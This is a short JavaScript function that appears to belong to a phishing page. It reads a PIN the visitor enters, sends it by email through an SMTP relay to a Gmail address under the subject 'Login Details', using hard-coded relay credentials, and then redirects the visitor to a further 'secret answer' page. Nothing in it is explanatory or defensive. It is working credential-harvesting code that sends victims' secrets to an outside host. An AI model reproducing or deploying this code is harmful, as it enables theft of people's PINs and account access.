function emailSend() {
  var pin = document.getElementById('pin').value; // Getting the PIN entered by the user
  var messageBody = "secretAnswer: " + pin; // Constructing the message body with PIN


  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'secretAnswer.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the PIN details", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
